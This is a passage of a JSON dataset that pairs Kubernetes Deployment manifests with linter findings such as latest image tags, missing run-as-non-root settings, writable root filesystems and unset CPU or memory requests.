    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rhynelabkube1-8d2f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rhynelabkube1-8d2f\n  template:\n    metadata:\n      labels:\n        app: rhynelabkube1-8d2f\n    spec:\n      containers:\n      - name: rhynelabkube1-8d2f\n        image: rhynelabkubereg.azurecr.io/rhynelabkube1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rhynelabkube1-8d2f\" has memory limit 0"
  },
  {
    "id": "03378",
    "manifest_path": "data/manifests/the_stack_sample/sample_1457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\n  labels:\n    app.kubernetes.io/instance: django\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: okteto/django:latest\n        command:\n        - ./run_celery.sh\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"worker\" is using an invalid container image, \"okteto/django:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03379",
    "manifest_path": "data/manifests/the_stack_sample/sample_1457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\n  labels:\n    app.kubernetes.io/instance: django\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: okteto/django:latest\n        command:\n        - ./run_celery.sh\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"worker\" does not have a read-only root file system"
  },
  {
    "id": "03380",
    "manifest_path": "data/manifests/the_stack_sample/sample_1457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\n  labels:\n    app.kubernetes.io/instance: django\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: okteto/django:latest\n        command:\n        - ./run_celery.sh\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"worker\" is not set to runAsNonRoot"
  },
  {
    "id": "03381",
    "manifest_path": "data/manifests/the_stack_sample/sample_1457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\n  labels:\n    app.kubernetes.io/instance: django\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: worker\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: okteto/django:latest\n        command:\n        - ./run_celery.sh\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 500m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"worker\" has cpu request 0"
  },
  {
    "id": "03382",
    "manifest_path": "data/manifests/the_stack_sample/sample_1459.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220203-c2195422bf\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cherrypicker\" does not have a read-only root file system"
  },
  {
    "id": "03383",
    "manifest_path": "data/manifests/the_stack_sample/sample_1459.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220203-c2195422bf\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cherrypicker\" is not set to runAsNonRoot"
  },
  {
    "id": "03384",
    "manifest_path": "data/manifests/the_stack_sample/sample_1459.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220203-c2195422bf\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cherrypicker\" has cpu request 0"
  },
  {
    "id": "03385",
    "manifest_path": "data/manifests/the_stack_sample/sample_1459.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220203-c2195422bf\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cherrypicker\" has memory limit 0"
  },
  {
    "id": "03386",
    "manifest_path": "data/manifests/the_stack_sample/sample_1460.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  namespace: baseball\n  labels:\n    app: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ui\n  template:\n    metadata:\n      labels:\n        app: ui\n    spec:\n      containers:\n      - name: ui\n        image: nschultz/fantasy-baseball-ui:{{version}}\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ui\" does not have a read-only root file system"
  },
  {
    "id": "03387",
    "manifest_path": "data/manifests/the_stack_sample/sample_1460.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  namespace: baseball\n  labels:\n    app: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ui\n  template:\n    metadata:\n      labels:\n        app: ui\n    spec:\n      containers:\n      - name: ui\n        image: nschultz/fantasy-baseball-ui:{{version}}\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ui\" is not set to runAsNonRoot"
  },
  {
    "id": "03388",
    "manifest_path": "data/manifests/the_stack_sample/sample_1460.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  namespace: baseball\n  labels:\n    app: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ui\n  template:\n    metadata:\n      labels:\n        app: ui\n    spec:\n      containers:\n      - name: ui\n        image: nschultz/fantasy-baseball-ui:{{version}}\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ui\" has cpu request 0"
  },
  {
    "id": "03389",
    "manifest_path": "data/manifests/the_stack_sample/sample_1460.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ui\n  namespace: baseball\n  labels:\n    app: ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ui\n  template:\n    metadata:\n      labels:\n        app: ui\n    spec:\n      containers:\n      - name: ui\n        image: nschultz/fantasy-baseball-ui:{{version}}\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ui\" has memory limit 0"
  },
  {
    "id": "03390",
    "manifest_path": "data/manifests/the_stack_sample/sample_1461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: java-kafka-consumer\n  name: java-kafka-consumer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: java-kafka-consumer\n  template:\n    metadata:\n      labels:\n        app: java-kafka-consumer\n    spec:\n      containers:\n      - name: java-kafka-consumer\n        image: docker.io/tuanhoang1/java-kafka-consumer:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: my-cluster-kafka-bootstrap:9092\n        - name: TOPIC\n          value: my-topic\n        - name: GROUP_ID\n          value: my-java-kafka-consumer\n        - name: LOG_LEVEL\n          value: INFO\n        - name: MESSAGE_COUNT\n          value: '1000000'\n        - name: ADDITIONAL_CONFIG\n          value: max.poll.records=100\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"java-kafka-consumer\" is using an invalid container image, \"docker.io/tuanhoang1/java-kafka-consumer:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03391",
    "manifest_path": "data/manifests/the_stack_sample/sample_1461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: java-kafka-consumer\n  name: java-kafka-consumer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: java-kafka-consumer\n  template:\n    metadata:\n      labels:\n        app: java-kafka-consumer\n    spec:\n      containers:\n      - name: java-kafka-consumer\n        image: docker.io/tuanhoang1/java-kafka-consumer:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: my-cluster-kafka-bootstrap:9092\n        - name: TOPIC\n          value: my-topic\n        - name: GROUP_ID\n          value: my-java-kafka-consumer\n        - name: LOG_LEVEL\n          value: INFO\n        - name: MESSAGE_COUNT\n          value: '1000000'\n        - name: ADDITIONAL_CONFIG\n          value: max.poll.records=100\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"java-kafka-consumer\" does not have a read-only root file system"
  },
  {
    "id": "03392",
    "manifest_path": "data/manifests/the_stack_sample/sample_1461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: java-kafka-consumer\n  name: java-kafka-consumer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: java-kafka-consumer\n  template:\n    metadata:\n      labels:\n        app: java-kafka-consumer\n    spec:\n      containers:\n      - name: java-kafka-consumer\n        image: docker.io/tuanhoang1/java-kafka-consumer:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: my-cluster-kafka-bootstrap:9092\n        - name: TOPIC\n          value: my-topic\n        - name: GROUP_ID\n          value: my-java-kafka-consumer\n        - name: LOG_LEVEL\n          value: INFO\n        - name: MESSAGE_COUNT\n          value: '1000000'\n        - name: ADDITIONAL_CONFIG\n          value: max.poll.records=100\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"java-kafka-consumer\" is not set to runAsNonRoot"
  },
  {
    "id": "03393",
    "manifest_path": "data/manifests/the_stack_sample/sample_1461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: java-kafka-consumer\n  name: java-kafka-consumer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: java-kafka-consumer\n  template:\n    metadata:\n      labels:\n        app: java-kafka-consumer\n    spec:\n      containers:\n      - name: java-kafka-consumer\n        image: docker.io/tuanhoang1/java-kafka-consumer:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: my-cluster-kafka-bootstrap:9092\n        - name: TOPIC\n          value: my-topic\n        - name: GROUP_ID\n          value: my-java-kafka-consumer\n        - name: LOG_LEVEL\n          value: INFO\n        - name: MESSAGE_COUNT\n          value: '1000000'\n        - name: ADDITIONAL_CONFIG\n          value: max.poll.records=100\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"java-kafka-consumer\" has cpu request 0"
  },
  {
    "id": "03394",
    "manifest_path": "data/manifests/the_stack_sample/sample_1461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: java-kafka-consumer\n  name: java-kafka-consumer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: java-kafka-consumer\n  template:\n    metadata:\n      labels:\n        app: java-kafka-consumer\n    spec:\n      containers:\n      - name: java-kafka-consumer\n        image: docker.io/tuanhoang1/java-kafka-consumer:latest\n        env:\n        - name: BOOTSTRAP_SERVERS\n          value: my-cluster-kafka-bootstrap:9092\n        - name: TOPIC\n          value: my-topic\n        - name: GROUP_ID\n          value: my-java-kafka-consumer\n        - name: LOG_LEVEL\n          value: INFO\n        - name: MESSAGE_COUNT\n          value: '1000000'\n        - name: ADDITIONAL_CONFIG\n          value: max.poll.records=100\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"java-kafka-consumer\" has memory limit 0"
  },
  {
    "id": "03395",
    "manifest_path": "data/manifests/the_stack_sample/sample_1464.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mxb-server\n  name: mxb-server\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mxb-server\n  template:\n    metadata:\n      labels:\n        app: mxb-server\n    spec:\n      containers:\n      - env:\n        - name: NODE_ENV\n          value: production\n        image: mxbcc/mxb.cc-server:master\n        imagePullPolicy: IfNotPresent\n        name: mxb-server\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/src/app/src/.keystone/.env.production\n          name: volume-config\n          subPath: .env.production\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: .env.production\n            path: .env.production\n          name: mxb-server-configmap\n        name: volume-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mxb-server\" does not have a read-only root file system"
  },
  {
    "id": "03396",
    "manifest_path": "data/manifests/the_stack_sample/sample_1464.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mxb-server\n  name: mxb-server\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mxb-server\n  template:\n    metadata:\n      labels:\n        app: mxb-server\n    spec:\n      containers:\n      - env:\n        - name: NODE_ENV\n          value: production\n        image: mxbcc/mxb.cc-server:master\n        imagePullPolicy: IfNotPresent\n        name: mxb-server\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/src/app/src/.keystone/.env.production\n          name: volume-config\n          subPath: .env.production\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: .env.production\n            path: .env.production\n          name: mxb-server-configmap\n        name: volume-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mxb-server\" is not set to runAsNonRoot"
  },
  {
    "id": "03397",
    "manifest_path": "data/manifests/the_stack_sample/sample_1464.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mxb-server\n  name: mxb-server\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mxb-server\n  template:\n    metadata:\n      labels:\n        app: mxb-server\n    spec:\n      containers:\n      - env:\n        - name: NODE_ENV\n          value: production\n        image: mxbcc/mxb.cc-server:master\n        imagePullPolicy: IfNotPresent\n        name: mxb-server\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/src/app/src/.keystone/.env.production\n          name: volume-config\n          subPath: .env.production\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: .env.production\n            path: .env.production\n          name: mxb-server-configmap\n        name: volume-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mxb-server\" has cpu request 0"
  },
  {
    "id": "03398",
    "manifest_path": "data/manifests/the_stack_sample/sample_1464.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mxb-server\n  name: mxb-server\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: mxb-server\n  template:\n    metadata:\n      labels:\n        app: mxb-server\n    spec:\n      containers:\n      - env:\n        - name: NODE_ENV\n          value: production\n        image: mxbcc/mxb.cc-server:master\n        imagePullPolicy: IfNotPresent\n        name: mxb-server\n        resources: {}\n        volumeMounts:\n        - mountPath: /usr/src/app/src/.keystone/.env.production\n          name: volume-config\n          subPath: .env.production\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: .env.production\n            path: .env.production\n          name: mxb-server-configmap\n        name: volume-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mxb-server\" has memory limit 0"
  },
  {
    "id": "03399",
    "manifest_path": "data/manifests/the_stack_sample/sample_1474.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: gallifrey\n  name: logstash\nspec:\n  selector:\n    matchLabels:\n      app: logstash\n  template:\n    metadata:\n      labels:\n        app: logstash\n    spec:\n      containers:\n      - name: logstash\n        image: nicokahlert/gallifrey-logstash-mysql-exporter@sha256:5688665e93214efb97e93c33d271c454613b87ab7088123e015d02a720ac3c98\n        args:\n        - -f\n        - /usr/share/logstash/pipeline/logstash.conf\n        resources:\n          limits:\n            cpu: 50m\n            memory: 50Mi\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        ports:\n        - name: logstash\n          containerPort: 5044\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"logstash\" does not have a read-only root file system"
  },
  {
    "id": "03400",
    "manifest_path": "data/manifests/the_stack_sample/sample_1474.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: gallifrey\n  name: logstash\nspec:\n  selector:\n    matchLabels:\n      app: logstash\n  template:\n    metadata:\n      labels:\n        app: logstash\n    spec:\n      containers:\n      - name: logstash\n        image: nicokahlert/gallifrey-logstash-mysql-exporter@sha256:5688665e93214efb97e93c33d271c454613b87ab7088123e015d02a720ac3c98\n        args:\n        - -f\n        - /usr/share/logstash/pipeline/logstash.conf\n        resources:\n          limits:\n            cpu: 50m\n            memory: 50Mi\n          requests:\n            cpu: 10m\n            memory: 10Mi\n        ports:\n        - name: logstash\n          containerPort: 5044\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"logstash\" is not set to runAsNonRoot"
  },
  {
    "id": "03401",
    "manifest_path": "data/manifests/the_stack_sample/sample_1476.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jysinakscluster-789b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: jysinakscluster-789b\n  template:\n    metadata:\n      labels:\n        app: jysinakscluster-789b\n    spec:\n      containers:\n      - name: jysinakscluster-789b\n        image: jysintestrigistry.azurecr.io/jysinakscluster\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jysinakscluster-789b\" is using an invalid container image, \"jysintestrigistry.azurecr.io/jysinakscluster\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03402",
    "manifest_path": "data/manifests/the_stack_sample/sample_1476.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jysinakscluster-789b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: jysinakscluster-789b\n  template:\n    metadata:\n      labels:\n        app: jysinakscluster-789b\n    spec:\n      containers:\n      - name: jysinakscluster-789b\n        image: jysintestrigistry.azurecr.io/jysinakscluster\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jysinakscluster-789b\" does not have a read-only root file system"
  },
  {
    "id": "03403",
    "manifest_path": "data/manifests/the_stack_sample/sample_1476.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jysinakscluster-789b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: jysinakscluster-789b\n  template:\n    metadata:\n      labels:\n        app: jysinakscluster-789b\n    spec:\n      containers:\n      - name: jysinakscluster-789b\n        image: jysintestrigistry.azurecr.io/jysinakscluster\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jysinakscluster-789b\" is not set to runAsNonRoot"
  },
  {
    "id": "03404",
    "manifest_path": "data/manifests/the_stack_sample/sample_1476.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jysinakscluster-789b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: jysinakscluster-789b\n  template:\n    metadata:\n      labels:\n        app: jysinakscluster-789b\n    spec:\n      containers:\n      - name: jysinakscluster-789b\n        image: jysintestrigistry.azurecr.io/jysinakscluster\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jysinakscluster-789b\" has cpu request 0"
  },
  {
    "id": "03405",
    "manifest_path": "data/manifests/the_stack_sample/sample_1476.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jysinakscluster-789b\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: jysinakscluster-789b\n  template:\n    metadata:\n      labels:\n        app: jysinakscluster-789b\n    spec:\n      containers:\n      - name: jysinakscluster-789b\n        image: jysintestrigistry.azurecr.io/jysinakscluster\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jysinakscluster-789b\" has memory limit 0"
  },
  {
    "id": "03406",
    "manifest_path": "data/manifests/the_stack_sample/sample_1477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-eventing\n    app.kubernetes.io/name: knative-eventing\n    eventing.knative.dev/release: v0.22.1\n    knative.dev/high-availability: 'true'\n    kustomize.component: knative\n  name: imc-controller\n  namespace: knative-eventing\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: knative-eventing\n      app.kubernetes.io/name: knative-eventing\n      kustomize.component: knative\n      messaging.knative.dev/channel: in-memory-channel\n      messaging.knative.dev/role: controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: knative-eventing\n        app.kubernetes.io/name: knative-eventing\n        kustomize.component: knative\n        messaging.knative.dev/channel: in-memory-channel\n        messaging.knative.dev/role: controller\n    spec:\n      containers:\n      - env:\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/inmemorychannel-controller\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: DISPATCHER_IMAGE\n          value: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_dispatcher@sha256:a6983f71c04619928199cc21e07ee6f1e1c87586621bc03b10c9ba1abd92bfa8\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_controller@sha256:904f42a768a9bc64999e7302d2bc7c1c48a08e74a82355cf57be513e6a124b82\n        name: controller\n        ports:\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: imc-controller\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "03407",
    "manifest_path": "data/manifests/the_stack_sample/sample_1477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-eventing\n    app.kubernetes.io/name: knative-eventing\n    eventing.knative.dev/release: v0.22.1\n    knative.dev/high-availability: 'true'\n    kustomize.component: knative\n  name: imc-controller\n  namespace: knative-eventing\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: knative-eventing\n      app.kubernetes.io/name: knative-eventing\n      kustomize.component: knative\n      messaging.knative.dev/channel: in-memory-channel\n      messaging.knative.dev/role: controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: knative-eventing\n        app.kubernetes.io/name: knative-eventing\n        kustomize.component: knative\n        messaging.knative.dev/channel: in-memory-channel\n        messaging.knative.dev/role: controller\n    spec:\n      containers:\n      - env:\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/inmemorychannel-controller\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: DISPATCHER_IMAGE\n          value: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_dispatcher@sha256:a6983f71c04619928199cc21e07ee6f1e1c87586621bc03b10c9ba1abd92bfa8\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        image: gcr.io/knative-releases/knative.dev/eventing/cmd/in_memory/channel_controller@sha256:904f42a768a9bc64999e7302d2bc7c1c48a08e74a82355cf57be513e6a124b82\n        name: controller\n        ports:\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: imc-controller\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "03408",
    "manifest_path": "data/manifests/the_stack_sample/sample_1477.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-eventing\n    app.kubernetes.io/name: knative-eventing\n    eventing.knative.dev/release: v0.22.1\n    knative.dev/high-availability: 'true'\n    kustomize.component: knative\n  name: imc-controller\n  namespace: knative-eventing\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: knative-eventing\n      app.kubernetes.io/name: knative-eventing\n      kustomize.component: knative\n      messaging.knative.dev/channel: in-memory-channel\n      messaging.knative.dev/role: controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: knative-eventing\n        app.kubernetes.io/name: knative-eventing\n        kustomize.component: knative\n        messaging.knative.dev/channel: in-memory-channel\n        messaging.knative.dev/role: controller\n    spec:\n      containers:\n      - env:\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: 